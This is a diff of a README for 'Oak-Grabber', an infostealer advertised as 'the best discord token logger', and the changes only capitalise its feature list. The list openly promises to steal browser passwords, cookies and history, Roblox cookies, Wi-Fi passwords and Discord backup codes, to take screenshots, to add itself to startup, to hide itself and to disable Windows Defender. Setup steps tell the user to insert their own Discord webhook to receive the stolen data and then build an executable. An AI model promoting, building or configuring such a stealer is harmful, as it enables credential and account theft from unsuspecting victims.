@@ -7,28 +7,28 @@ The best discord token logger!
 - Steal google Passwords
 - Steal google Cookies 
 - Steal google History 
-- steal desktop screenshot
-- steal roblox cookies
-- steal wifi passwords  
+- Steal desktop screenshot
+- Steal roblox cookies
+- Steal wifi passwords  
 - Fake message box  
-- add to startup  
+- Add to startup  
 - Self hide  
-- kinda clean embed  
-- steal minecraft info and logs  
-- steal mac adress
-- steal system hwid
-- steal system model
-- epic games offline data
-- discord backup codes
-- disable windows defender 
-- discord info
-- and more stuff
+- Kinda clean embed  
+- Steal minecraft info and logs  
+- Steal mac adress
+- Steal system hwid
+- Steal system model
+- Epic games offline data
+- Discord backup codes
+- Disable windows defender 
+- Discord info
+- And more stuff
   
 **Setup:**  
- step 1: `download python` [here](https://www.python.org/downloads/)  
- step 2: `run install-requirements.bat`  
- step 3: `change webhook here to your discord webhook in main.py`  
- step 4: `run build-exe.bat`  
+ Step 1: `download python` [here](https://www.python.org/downloads/)  
+ Step 2: `run install-requirements.bat`  
+ Step 3: `change webhook here to your discord webhook in main.py`  
+ Step 4: `run build-exe.bat`  
  
  
  # Oak-Grabber
